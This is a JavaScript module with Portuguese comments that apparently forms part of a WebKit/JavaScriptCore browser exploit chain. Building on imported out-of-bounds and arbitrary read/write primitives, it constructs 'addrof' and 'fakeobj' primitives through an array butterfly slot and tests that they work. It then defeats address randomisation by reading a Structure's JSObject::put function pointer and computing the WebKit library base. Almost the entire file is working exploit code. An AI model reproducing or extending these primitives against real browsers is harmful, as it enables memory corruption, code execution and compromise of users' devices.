// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO COM ESTRATÉGIA ROBUSTA E CORREÇÕES)
// =======================================================================================
// MUDANÇAS DA VERSÃO:
// - Estratégia de `addrof` robustecida usando um Array como 'scratchpad' para garantir
//   a existência de uma 'butterfly' com ponteiro válido.
// - Teste das primitivas na Fase 3 melhorado para evitar falsos-positivos.
// - Correção do `TypeError` ao acessar o offset da função na Fase 4.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read as core_arb_read,
    arb_write as core_arb_write
} from '../core_exploit.mjs';
// Importação corrigida para incluir WEBKIT_LIBRARY_INFO
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// Funções de conversão (do original)
function doubleToInt64(double) { const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf); return new AdvancedInt64(u32[0], u32[1]); }
function getSafeOffset(baseObject, path, defaultValue = 0) { let current = baseObject; const parts = path.split('.'); for (const part of parts) { if (current && typeof current === 'object' && part in current) { current = current[part]; } else { return defaultValue; } } if (typeof current === 'number') { return current; } if (typeof current === 'string' && String(current).startsWith('0x')) { return parseInt(String(current), 16) || defaultValue; } return defaultValue; }

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} (Estratégia Robusta v2) ---`, "test");
    let final_result = {
        success: false,
        message: "Teste não concluído.",
        primitives_functional: false,
        webkit_base_addr: null
    };

    try {
        await PAUSE_S3(1000);
        const LOCAL_JSC_OFFSETS = {
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET')
        };

        // --- FASE 1: OBTER L/E ARBITRÁRIA BÁSICA ---
        logS3("--- FASE 1: Obtendo L/E Arbitrária Básica ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        logS3("Primitiva de L/E do Core operacional.", "good");

        // --- FASE 2: CONSTRUINDO PRIMITIVAS SINTÉTICAS (ESTRATÉGIA DE ARRAY) ---
        logS3("--- FASE 2: Construindo Primitivas Sintéticas (Estratégia de Array) ---", "subtest");
        
        const bootstrap_addrof = (obj) => { const ca=[13.37], va=[{}]; va[0]=obj; return doubleToInt64(ca[0]); };

        // Usar um Array para garantir uma butterfly. O elemento no índice 1 será nosso slot.
        const scratchpad_array = [13.37, null];
        const scratchpad_addr = bootstrap_addrof(scratchpad_array);

        if(!isAdvancedInt64Object(scratchpad_addr) || scratchpad_addr.equals(AdvancedInt64.Zero)) {
             throw new Error("Falha no bootstrap: addrof inicial não retornou um endereço válido para o array.");
        }

        const butterfly_addr = await core_arb_read(scratchpad_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET), 8);
        // O slot está no índice 1 do array (8 bytes após o início da butterfly)
        const slot_addr = butterfly_addr.add(8);
        
        logS3(`'Scratchpad Array' criado em ${scratchpad_addr.toString(true)}`, 'debug');
        logS3(`Endereço da Butterfly do Array: ${butterfly_addr.toString(true)}`, 'debug');
        logS3(`Endereço do slot (índice 1): ${slot_addr.toString(true)}`, 'debug');
        
        if (butterfly_addr.equals(AdvancedInt64.Zero)) {
            throw new Error("A Butterfly do Array é NULA. A estratégia de `addrof` falhou.");
        }

        const addrof = async (obj) => {
            scratchpad_array[1] = obj;
            return await core_arb_read(slot_addr, 8);
        };

        const fakeobj = async (addr) => {
            await core_arb_write(slot_addr, addr, 8);
            return scratchpad_array[1];
        };
        logS3("Primitivas sintéticas 'addrof' e 'fakeobj' (baseadas em Array) prontas.", "good");

        // --- FASE 3: TESTANDO PRIMITIVAS SINTÉTICAS (TESTE ROBUSTO) ---
        logS3("--- FASE 3: Testando Primitivas Sintéticas (Teste Robusto) ---", "subtest");
        const test_obj_A = { type: 'A', val: 0xAAAAAAAA };
        const test_obj_B = { type: 'B', val: 0xBBBBBBBB };

        const addr_A = await addrof(test_obj_A);
        const faked_A = await fakeobj(addr_A);

        const addr_B = await addrof(test_obj_B);
        const faked_B = await fakeobj(addr_B);
        
        logS3(`addrof(obj_A) => ${addr_A.toString(true)}`, "debug");
        logS3(`addrof(obj_B) => ${addr_B.toString(true)}`, "debug");
        logS3(`fakeobj(addr_A) => tipo: ${faked_A.type}, val: ${toHex(faked_A.val)}`, "debug");
        logS3(`fakeobj(addr_B) => tipo: ${faked_B.type}, val: ${toHex(faked_B.val)}`, "debug");

        if (faked_A.val === test_obj_A.val && faked_B.val === test_obj_B.val && !addr_A.equals(addr_B)) {
            logS3("++++++++++ SUCESSO! Primitivas sintéticas são funcionais (verificação robusta passou). ++++++++++", "vuln");
            final_result.primitives_functional = true;
        } else {
            throw new Error("Falha na verificação robusta das primitivas sintéticas.");
        }

        // --- FASE 4: VAZANDO ENDEREÇO BASE DO WEBKIT ---
        logS3("--- FASE 4: Vazando Endereço Base do WebKit ---", "subtest");

        const leak_target_obj = { marker: 0x41424344 };
        const leak_target_addr = await addrof(leak_target_obj);
        logS3(`Endereço do objeto alvo para vazamento: ${leak_target_addr.toString(true)}`, "info");

        const structure_addr = await core_arb_read(leak_target_addr.add(LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET), 8);
        logS3(`Endereço da Estrutura lido em offset 0x${LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET.toString(16)}: ${structure_addr.toString(true)}`, "info");

        const put_func_ptr = await core_arb_read(structure_addr.add(LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET), 8);
        logS3(`Ponteiro de função (JSObject::put) lido em offset 0x${LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET.toString(16)}: ${put_func_ptr.toString(true)}`, "leak");
        
        // Caminho corrigido para acessar o offset da função
        const put_func_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS['JSC::JSObject::put'];
        const put_func_library_offset = new AdvancedInt64(put_func_offset_str);
        const webkit_base_addr = put_func_ptr.sub(put_func_library_offset);

        logS3(`Offset de JSC::JSObject::put na biblioteca: ${put_func_offset_str}`, "info");
        logS3(`++++++++++ SUCESSO! Endereço base do WebKit calculado: ${webkit_base_addr.toString(true)} ++++++++++`, "vuln");
        
        final_result.success = true;
        final_result.webkit_base_addr = webkit_base_addr.toString(true);
        final_result.message = "Base de ferramentas de exploração estável e endereço base do WebKit obtidos com sucesso.";

        return final_result;

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído com erros ---`, "test");
    return { 
        ...final_result,
        errorOccurred: final_result.success ? null : final_result.message 
    };
}
